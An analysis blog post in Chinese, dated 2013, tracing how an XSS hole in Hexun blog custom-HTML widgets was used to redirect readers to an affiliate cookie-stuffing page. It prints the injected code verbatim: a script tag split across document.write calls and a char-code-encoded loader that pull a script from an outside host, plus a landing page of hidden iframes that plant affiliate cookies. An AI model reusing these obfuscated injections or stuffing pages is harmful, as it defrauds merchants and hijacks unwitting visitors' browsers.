---
layout: post
status: publish
published: true
title: 和讯博客XSS漏洞被用于CS
author:
 display_name: chaoshikari
 login: chaoshikari
 email: chaoshikari@gmail.com
 url: http://blog.ch-wind.com
author_login: chaoshikari
author_email: chaoshikari@gmail.com
author_url: http://blog.ch-wind.com
wordpress_id: 802
wordpress_url: http://blog.ch-wind.com/?p=802
date: '2013-11-19 13:16:18 +0000'
date_gmt: '2013-11-19 05:16:18 +0000'
tags:
- hack
---
今天逛和讯博客看文章，顺便收集点人气。没想到碰到个在和讯利用xss漏洞做cs的。在和讯主要的操作方式是注册好账号，添加好相关代码然后不停的去各处顶贴，目测是用程序自动顶的。因为能看到的文章里面基本都能看到这样的顶贴记录，而且还是多账号的。


跳转的过程大致是这样的：



```
http://hexun.com/xxxxxxxx
http://hexun.com/xxxxxxxx/default.html
http://insure.dbxdb.com/e.php
http://farms.tw/shop/templates/ad1.html
```

xss的漏洞来源应该是博客文章，和讯的博客文章发布的时候代码检测并不十分严格。代码执行过程中访问了http://insure.dbxdb.com/ejs.php，输出内容是



```
location.href="http://insure.dbxdb.com/e.php";
```

估计是用这样的方法绕过了代码检测。


仔细的看了下，不是博客文章，而是在自定义html里面。关键的部分是这样的：



```
 <div id="SelfHtmlDivItem" class="side_content">   
        <p id="SelfHtmlImport0" align=left style="display:none">添加自定义HTML内容，<a href='http://i.hexun.com/manage/admin_moduleset.aspx?link=3'>点击添加</a></p>
        <p id="SelfHtmlImport1" align=left style="display:none">请等待审核，<a href='http://i.hexun.com/manage/admin_moduleset.aspx?link=3'>修改请点击这里</a></p>
	    <script>
	document.write('<scri');
	document.write('pt src');
	document.write('="http://insure.dbxd');
	document.write('b.com/ejs.php"><\/script>');
</script>
111,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,83,67,82,73,80,84,34,41,59,111,46,115,114,99,61,34,104,116,116,112,58,47,47,105,110,115,117,114,101,46,100,98,120,100,98,46,99,111,109,47,101,106,115,46,112,104,112,34,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,104,101,97,100,34,41,46,105,116,101,109,40,48,41,46,97,112,112,101,110,100,67,104,105,108,100,40,111,41,59),20xdb.com/ejs.ph111,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,83,67,82,73,80,84,34,41,59,111,46,115,114,99,61,34,104,116,116,112,58,47,47,105,110,115,117,114,101,46,100,98,120,100,98,46,99,111,109,47,101,106,115,46,112,104,112,34,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,104,101,97,100,34,41,46,105,116,101,109,40,48,41,46,97,112,112,101,110,100,67,104,105,108,100,40,111,41,59),20p
	</div>
```

最终跳转的页面源码如下：



```
<img src="http://g.search1.alicdn.com/img/bao/uploaded/i4/i4/17493037705800171/T1uqqOXv0gXXXXXXXX_!!0-item_pic.jpg_170x170.jpg" />

<div style="display:none;">
<EMBED SRC="ad.mp3" AUTOSTART=TRUE>

<script src="http://s96.cnzz.com/stat.php?id=1889573&web_id=1889573" language="JavaScript"></script>

<iframe width=0 height=0 frameborder=0 src="http://www.amazon.cn/b?_encoding=UTF8&camp=536&creative=3200&linkCode=ur2&node=49932071&tag=tie3net-23"></iframe>

<iframe width=0 height=0 frameborder=0 src="http://s.click.taobao.com/t?e=zGU34CA7K%2BPkqB07S4%2FK0CFcRfH0GoT805sipKaf%2FVLG1VK%2F3p8nxHfYXTB%2FXjAqwOU7mQs5RPdhLITkr2Okp%2BNMyKT82%2Bo3M2YtuXaO8tDjzw%3D%3D"></iframe>

<iframe width=0 height=0 frameborder=0 src="http://www.amazon.com/mn/landing/7593381011/?_encoding=UTF8&camp=1789&creative=390957&linkCode=ur2&tag=30-10-20"></iframe>

<iframe width=0 height=0 frameborder=0 src="http://www.amazon.cn/?tag=eqifarebate-23&ascsubtag=150|1|4435530"></iframe>

<iframe width=0 height=0 frameborder=0 src="http://www.amazon.cn/b/?_encoding=UTF8&camp=536&creative=3132&linkCode=ur2&node=339373071&tag=jyn-23"></iframe>

<iframe width=0 height=0 frameborder=0 src="http://www.amazon.com/b/?t=hanx01-20&camp=1789&creative=390957&linkCode=ur2&node=7795318011&pf_rd_i=B008626CSS&pf_rd_m=ATVPDKIKX0DER&pf_rd_p=1657478282&pf_rd_r=12P4PZPS5MC6TEGDCBX6&pf_rd_s=hero-quick-promo&pf_rd_t=201&tag=hanx01-20"></iframe>

<iframe src="http://www.qjhm.net"></iframe>

<script>
/*
setTimeout('location.href="http://www.amazon.cn/b?_encoding=UTF8&camp=536&creative=3200&linkCode=ur2&node=49932071&tag=tie3net-23";',5000);
*/
</script>

</div>
```

网页是静态的，看来没有进行复杂的多账号分割。同时也没有对Refer来源也进行保护，由于亚马逊有付款延迟，这样的手法基本靠运气。同时有往天猫去的cs和刷另外一个网页的展示。应该是想要尽可能的利用流量吧。


途中经过的网站insure.dbxdb.com本身也有在做亚马逊的cs，可见是和操作者有关的站点。另外一个在刷展示的站似乎有做备案，应该不至于是操作者的站。落点网站是岛民的站点，不知道是被黑的还是本人的站点，和前一个不一样有做whois保护，所以无法证实。不过目录的结构有点奇怪，不太可能不被站长发现，估计也是操作者的站。


过多的去探寻别人的个人信息是不礼貌的，所以我也就没有详细看了。


~~PS：这篇文章将会在漏洞被修补之后再取消密码保护，以免有断人财路之嫌。密码是我qq昵称:D~~


漏洞已经以某种形式被遏制住了。


